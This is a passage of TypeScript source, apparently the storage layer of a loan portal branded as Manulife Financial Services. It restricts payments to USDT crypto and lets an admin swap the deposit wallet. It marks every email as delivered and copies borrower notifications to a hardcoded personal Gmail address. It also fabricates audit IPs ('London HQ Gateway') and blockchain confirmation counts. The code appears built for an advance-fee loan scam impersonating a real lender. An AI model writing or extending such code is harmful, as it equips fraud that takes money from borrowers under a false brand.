              <span style="font-size: 11px; text-transform: uppercase; color: #64748b; font-weight: bold; display: block;">Notification Classification:</span>
              <span style="font-size: 13px; font-weight: 600; color: #0f172a;">${notif.type.replace('_', ' ').toUpperCase()}</span>
            </div>
            <p style="font-size: 12px; color: #64748b; margin-top: 20px;">
              You can access your complete loan dossier, active escrow balances, and legal documentation at any time through the Manulife Financial Services secure portal using reference <strong>${notif.applicationId}</strong>.
            </p>
          </div>
        `;

        await this.sendEmailNotification({
          applicationId: notif.applicationId,
          recipientEmail: notif.recipientEmail,
          recipientName,
          ccEmail: emailSettings.liaisonEmail || 'echezonachukwuokafor16@gmail.com',
          fromEmail: emailSettings.senderEmail,
          fromName: emailSettings.senderName,
          subject: `[Manulife Financial Services Ref: ${notif.applicationId}] ${notif.title}`,
          previewText: notif.message.slice(0, 120),
          htmlContent: html,
          plainTextContent: notif.message,
          triggerEvent: trigger,
        });
      }
    } catch (emailErr) {
      console.warn('Failed to dispatch automatic email notification:', emailErr);
    }
  }

  async markNotificationRead(id: string): Promise<void> {
    const current = await this.getNotifications();
    const updated = current.map((n) => (n.id === id ? { ...n, isRead: true } : n));
    this.setLocal(STORAGE_KEYS.NOTIFICATIONS, updated);
  }

  // === EMAIL NOTIFICATIONS ===
  async getEmailDispatchSettings(): Promise<EmailDispatchSettings> {
    const contact = await this.getContactSettings();
    const defaults: EmailDispatchSettings = {
      ...INITIAL_EMAIL_SETTINGS,
      liaisonEmail: contact.directLiaisonEmail || 'echezonachukwuokafor16@gmail.com',
    };
    return this.getLocal<EmailDispatchSettings>(STORAGE_KEYS.EMAIL_SETTINGS, defaults);
  }

  async saveEmailDispatchSettings(settings: EmailDispatchSettings, adminName?: string): Promise<EmailDispatchSettings> {
    const updated: EmailDispatchSettings = {
      ...settings,
      updatedAt: new Date().toISOString(),
      updatedBy: adminName || settings.updatedBy || 'Authorized Administrator',
    };
    this.setLocal(STORAGE_KEYS.EMAIL_SETTINGS, updated);
    return updated;
  }

  async getEmailLogs(applicationId?: string): Promise<EmailNotificationRecord[]> {
    const all = this.getLocal<EmailNotificationRecord[]>(STORAGE_KEYS.EMAIL_LOGS, INITIAL_EMAIL_LOGS);
    if (applicationId) {
      return all.filter((e) => e.applicationId.toLowerCase() === applicationId.toLowerCase());
    }
    return all;
  }

  async getEmailLogById(id: string): Promise<EmailNotificationRecord | null> {
    const all = await this.getEmailLogs();
    return all.find((e) => e.id === id) || null;
  }

  async sendEmailNotification(emailData: Partial<EmailNotificationRecord>): Promise<EmailNotificationRecord> {
    const settings = await this.getEmailDispatchSettings();
    const all = this.getLocal<EmailNotificationRecord[]>(STORAGE_KEYS.EMAIL_LOGS, INITIAL_EMAIL_LOGS);

    const record: EmailNotificationRecord = {
      id: emailData.id || `eml-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
      applicationId: emailData.applicationId || 'MFS-GENERAL',
      recipientEmail: emailData.recipientEmail || 'borrower@escrow-client.com',
      recipientName: emailData.recipientName || 'Valued Client',
      ccEmail: emailData.ccEmail !== undefined ? emailData.ccEmail : (settings.liaisonEmail || 'echezonachukwuokafor16@gmail.com'),
      fromEmail: emailData.fromEmail || settings.senderEmail || 'notifications@manulife-financial.com',
      fromName: emailData.fromName || settings.senderName || 'Manulife Financial Services Notifications',
      subject: emailData.subject || `[Manulife Financial Services] Important Loan Facility Notification`,
      previewText: emailData.previewText || (emailData.plainTextContent ? emailData.plainTextContent.slice(0, 120) : (emailData.message ? emailData.message.slice(0, 120) : 'Official financial notification from credit committee.')),
      htmlContent: emailData.htmlContent || `<p>${emailData.plainTextContent || emailData.message || 'Official financial statement from Manulife Financial Services.'}</p>`,
      plainTextContent: emailData.plainTextContent || emailData.message || emailData.previewText || 'Official financial statement.',
      message: emailData.message || emailData.plainTextContent || emailData.previewText,
      badgeText: emailData.badgeText,
      trigger: emailData.trigger,
      triggerEvent: emailData.triggerEvent || 'status_changed',
      status: 'delivered',
      sentAt: emailData.sentAt || new Date().toISOString(),
      deliveredAt: emailData.deliveredAt || new Date().toISOString(),
      timestamp: emailData.timestamp || emailData.sentAt || new Date().toISOString(),
      details: emailData.details,
    };

    const updated = [record, ...all];
    this.setLocal(STORAGE_KEYS.EMAIL_LOGS, updated);

    // Dispatch global event for live toast and component reactivity
    window.dispatchEvent(new CustomEvent('mfs_email_dispatched', { detail: record }));

    return record;
  }

  // === MESSAGES ===
  async getMessages(applicationId: string): Promise<SupportMessage[]> {
    const all = this.getLocal<SupportMessage[]>(STORAGE_KEYS.MESSAGES, INITIAL_MESSAGES);
    return all.filter((m) => m.applicationId === applicationId);
  }

  async sendMessage(msg: SupportMessage): Promise<void> {
    const all = this.getLocal<SupportMessage[]>(STORAGE_KEYS.MESSAGES, INITIAL_MESSAGES);
    this.setLocal(STORAGE_KEYS.MESSAGES, [...all, msg]);

    if (isSupabaseConfigured && supabase) {
      try {
        await supabase.from('support_messages').insert(msg);
      } catch (err) {
        console.warn('Supabase msg error:', err);
      }
    }
  }

  // === PAYMENT SETTINGS & AUDIT LOGS ===
  async getPaymentSettings(): Promise<PaymentSettings> {
    const raw = this.getLocal<PaymentSettings>(STORAGE_KEYS.PAYMENT_SETTINGS, INITIAL_PAYMENT_SETTINGS);
    const cryptoOnly = raw.methods.filter(m => m.category === 'crypto' || m.id === 'usdt_crypto' || m.id.includes('crypto'));
    return {
      ...raw,
      methods: cryptoOnly.length > 0 ? cryptoOnly : INITIAL_PAYMENT_SETTINGS.methods,
    };
  }

  async savePaymentSettings(
    settings: PaymentSettings,
    adminName: string = 'Authorized Administrator',
    adminEmail: string = 'admin@manulife-financial.com',
    actionDescription: string = 'Updated payment configuration',
    twoFactorVerified: boolean = true
  ): Promise<PaymentSettings> {
    // Synchronize methods with usdtConfig so both tabs and all views reflect the active USDT wallet
    const activeNet = settings.usdtConfig.supportedNetworks.find(n => n.id === settings.usdtConfig.activeNetworkId) 
      || settings.usdtConfig.supportedNetworks.find(n => n.active) 
      || settings.usdtConfig.supportedNetworks[0];

    const updatedMethods = settings.methods.map(m => {
      if (m.id === 'usdt_crypto' || m.category === 'crypto') {
        return {
          ...m,
          providerAccountOrAddress: `${activeNet.depositAddress} (${activeNet.tokenStandard} Custody)`,
          providerName: settings.usdtConfig.authorizedCustodian.split('/')[0].trim(),
        };
      }
      return m;
    });

    const updated: PaymentSettings = {
      ...settings,
      methods: updatedMethods,
      updatedAt: new Date().toISOString(),
      updatedBy: adminName,
    };
    this.setLocal(STORAGE_KEYS.PAYMENT_SETTINGS, updated);

    // Append to audit trail
    await this.addPaymentAuditLog({
      adminName,
      adminEmail,
      action: actionDescription,
      details: `Payment methods and USDT custody settings updated. 2FA Authentication: ${twoFactorVerified ? 'PASSED (TOTP)' : 'BYPASS'}. Active network: ${activeNet.name} (${activeNet.tokenStandard}). Deposit address: ${activeNet.depositAddress}.`,
      ipAddress: '194.28.112.45 (London HQ Gateway)',
      twoFactorVerified,
    });

    return updated;
  }

  async updateUsdtWalletAddress(
    networkId: string,
    newAddress: string,
    setAsActive: boolean = true,
    adminName: string = 'Authorized Administrator'
  ): Promise<PaymentSettings> {
    const current = await this.getPaymentSettings();
    const updatedNetworks = current.usdtConfig.supportedNetworks.map(net => {
      if (net.id === networkId) {
        return { ...net, depositAddress: newAddress.trim() };
      }
      return net;
    });

    const newSettings: PaymentSettings = {
      ...current,
      usdtConfig: {
        ...current.usdtConfig,
        supportedNetworks: updatedNetworks,
        activeNetworkId: setAsActive ? networkId : current.usdtConfig.activeNetworkId,
      },
    };

    return this.savePaymentSettings(
      newSettings,
      adminName,
      'admin@manulife-financial.com',
      `Updated ${networkId.toUpperCase()} custody wallet address to: ${newAddress.trim()}`,
      true
    );
  }

  async getPaymentAuditLogs(): Promise<PaymentAuditLog[]> {
    return this.getLocal<PaymentAuditLog[]>(STORAGE_KEYS.PAYMENT_AUDIT_LOGS, INITIAL_AUDIT_LOGS);
  }

  async addPaymentAuditLog(log: Omit<PaymentAuditLog, 'id' | 'timestamp'>): Promise<PaymentAuditLog> {
    const all = await this.getPaymentAuditLogs();
    const newEntry: PaymentAuditLog = {
      ...log,
      id: `log-${Date.now()}`,
      timestamp: new Date().toISOString(),
    };
    this.setLocal(STORAGE_KEYS.PAYMENT_AUDIT_LOGS, [newEntry, ...all]);
    return newEntry;
  }

  // === CRYPTO TRANSACTION VERIFICATIONS ===
  async getCryptoVerifications(applicationId?: string): Promise<CryptoTransactionVerification[]> {
    const all = this.getLocal<CryptoTransactionVerification[]>(STORAGE_KEYS.CRYPTO_VERIFICATIONS, INITIAL_CRYPTO_VERIFICATIONS);
    if (applicationId) {
      return all.filter((v) => v.applicationId.toLowerCase() === applicationId.toLowerCase());
    }
    return all;
  }

  async submitCryptoVerification(
    verification: Omit<CryptoTransactionVerification, 'id' | 'submittedAt' | 'status' | 'confirmations'>
  ): Promise<CryptoTransactionVerification> {
    const all = await this.getCryptoVerifications();
    const entry: CryptoTransactionVerification = {
      ...verification,
      id: `txv-${Date.now()}`,
      submittedAt: new Date().toISOString(),
      status: 'pending_verification',
      confirmations: 14, // starting mock confirmation state
    };
    this.setLocal(STORAGE_KEYS.CRYPTO_VERIFICATIONS, [entry, ...all]);

    // Send official receipt notification to applicant
    await this.addNotification({
      id: `notif-${Date.now()}`,
      applicationId: verification.applicationId,
      recipientEmail: 'borrower@escrow-client.com',
      title: 'USDT Crypto Settlement Hash Received',
      message: `Your USDT transaction hash ${verification.txHash.slice(0, 10)}... has been submitted for independent ledger verification. Ref: ${verification.receiptNumber}. Note: Blockchain transactions do not guarantee loan approval.`,
      timestamp: new Date().toISOString(),
      type: 'info',
      isRead: false,
    });

    return entry;
  }

  async updateCryptoVerificationStatus(
    id: string,
    status: 'verified' | 'rejected',
    verifiedBy: string,
    notes?: string
  ): Promise<CryptoTransactionVerification | null> {
    const all = await this.getCryptoVerifications();
    const index = all.findIndex((v) => v.id === id);
    if (index === -1) return null;

    const updated: CryptoTransactionVerification = {
      ...all[index],
      status,
      verifiedAt: new Date().toISOString(),
      verifiedBy,
      confirmations: status === 'verified' ? all[index].requiredConfirmations : all[index].confirmations,
      notes: notes || all[index].notes,
    };

    all[index] = updated;
    this.setLocal(STORAGE_KEYS.CRYPTO_VERIFICATIONS, all);

    // If verified, record in audit log
    await this.addPaymentAuditLog({
      adminName: verifiedBy,
      adminEmail: 'admin@manulife-financial.com',
      action: `USDT Ledger Transaction ${status.toUpperCase()}`,
      details: `Transaction ${updated.txHash.slice(0, 14)}... for Application ${updated.applicationId} ($${updated.equivalentUsd.toLocaleString()}) marked as ${status}.`,
      ipAddress: '194.28.112.45',
      twoFactorVerified: true,
    });

    return updated;
  }

  // === CONTACT & SUPPORT EMAIL SETTINGS ===
  async getContactSettings(): Promise<CompanyContactSettings> {
    const saved = this.getLocal<CompanyContactSettings>(STORAGE_KEYS.CONTACT_SETTINGS, INITIAL_CONTACT_SETTINGS);
    return {
      ...INITIAL_CONTACT_SETTINGS,
      ...saved,
    };
  }

  async saveContactSettings(
    settings: CompanyContactSettings,
    adminName: string = 'Authorized Administrator',
    adminEmail: string = 'admin@manulife-financial.com'
  ): Promise<CompanyContactSettings> {
    const updated: CompanyContactSettings = {
      ...settings,
      updatedAt: new Date().toISOString(),
      updatedBy: adminName,
    };
    this.setLocal(STORAGE_KEYS.CONTACT_SETTINGS, updated);

    // Record in audit log
    await this.addPaymentAuditLog({
      adminName,
      adminEmail,
      action: 'Updated Support & Contact Email Configuration',
      details: `Support email set to: ${settings.supportEmail}, Direct liaison set to: ${settings.directLiaisonEmail}, Phone: ${settings.supportPhone}`,
      ipAddress: '194.28.112.45 (London HQ Gateway)',
      twoFactorVerified: true,
    });

    return updated;
  }

  // Reset to demo state
  resetToDemo(): void {
    localStorage.setItem(STORAGE_KEYS.APPLICATIONS, JSON.stringify(INITIAL_APPLICATIONS));
    localStorage.setItem(STORAGE_KEYS.NOTIFICATIONS, JSON.stringify(INITIAL_NOTIFICATIONS));
    localStorage.setItem(STORAGE_KEYS.MESSAGES, JSON.stringify(INITIAL_MESSAGES));
    localStorage.setItem(STORAGE_KEYS.PAYMENT_SETTINGS, JSON.stringify(INITIAL_PAYMENT_SETTINGS));
    localStorage.setItem(STORAGE_KEYS.PAYMENT_AUDIT_LOGS, JSON.stringify(INITIAL_AUDIT_LOGS));
    localStorage.setItem(STORAGE_KEYS.CRYPTO_VERIFICATIONS, JSON.stringify(INITIAL_CRYPTO_VERIFICATIONS));
    localStorage.setItem(STORAGE_KEYS.CONTACT_SETTINGS, JSON.stringify(INITIAL_CONTACT_SETTINGS));
    window.dispatchEvent(new Event('verdant_storage_update'));
  }
}

export const storage = new StorageService();
